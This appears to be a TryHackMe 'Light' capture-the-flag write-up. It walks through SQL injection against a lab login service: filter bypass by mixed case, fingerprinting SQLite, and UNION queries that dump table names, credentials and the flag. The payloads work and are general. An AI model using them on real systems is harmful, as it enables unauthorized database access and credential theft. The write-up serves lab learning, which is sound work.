# THM - Light

**Target IP:** 10.49.158.200

Connect using netcat,
```bash
nc 10.49.158.200 1337
```

It prompts us to give a username, giving username smokey give us its password.
So in this, we have to provide a username, and it gives us its password only if that username exist in database. This is called database lookup.

## Methodology
Maybe it is vulnerable to SQL injection.
So testing inputs like 
```
smokey'
smokey"
smokey*
smokey%
' OR '1'='1
admin' --
```
For the input: `' OR '1'='1` , it gives us a password **tF8tj2o94WE4LKC**. The username of the password we found using this query maybe the first username in database.
This tells us that backend is doing something like
```
SELECT password FROM users WHERE username = 'YOUR_INPUT' LIMIT 30;
```
It is vulnerable to SQL injection.
Now we will try some other inputs for this 
```
' UNION SELECT username FROM users WHERE '1'='1
```
**Output: Ahh there is a word in there I don't like :(**

So the app is filtering certain keywords like UNION, SELECT. We can try to find what keywords are blocked
```
' SELECT
' UNION
' WHERE
' union   # check for case sensitivity too!
```
like this we will know the blocked keywords. But we can bypass them using mixed cases.
```
Union
Select
```

We can guess a username using LIKE operator.
```
' OR username LIKE 'a%
```
this will return a password that we got at first, but
```
' OR username LIKE 'b%
```
will return username not found.

Like that we found for second character.
```
' OR username LIKE 'al%
```
this will also return the same password!
To find which database it is using, I tried:
```
Please enter your username: ' Union selecT "abc" FROm dual
Error: unrecognized token: "' LIMIT 30"
Please enter your username: ' Select Version FROM v$instance   
Error: near "Select": syntax error
Please enter your username: ' Select version()
Error: near "Select": syntax error
Please enter your username: ' Select @@version
Error: near "Select": syntax error
Please enter your username: ' Select * From all_tables
Error: near "Select": syntax error
Please enter your username: ' Select !
Error: near "Select": syntax error
Please enter your username: ' Union Select "abc" from dual
Error: unrecognized token: "' LIMIT 30"
Please enter your username: ' Union Select version()
Error: unrecognized token: "' LIMIT 30"
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```
We can now confirm that it is SQLite database.
Now we need to find what table exist in the database
```
' Union Select name from sqlite_master Where type='table
```
With that we found that table name - **admintable**
Now we will find the table info through this command:
```
' Union Select sql from sqlite_master Where type='table' And name='admintable
```
Now we need to find the username,
```
' Union Select username from admintable '
```
This will reveal the username. To find the password of the username we found,
```
' Union Select password from admintable Where username='<username>
```
Now for the final flag, we search for every column in admintable but the flag isn't there. Maybe there are more tables.
```
' Union Select name from sqlite_master Where type='table' And name!='admintable
```
There is another table called **usertable** whose structure is same as **admintable**. The password of usertable matches the one we found early **tF8tj2o94WE4LKC** where username was alice.
The mystery here we found that in both table, the password is of type integer but is showing us text. Maybe something encoding etc like that.
```
' Union Select cast(password as text) from admintable '
```
This will reveal the flag.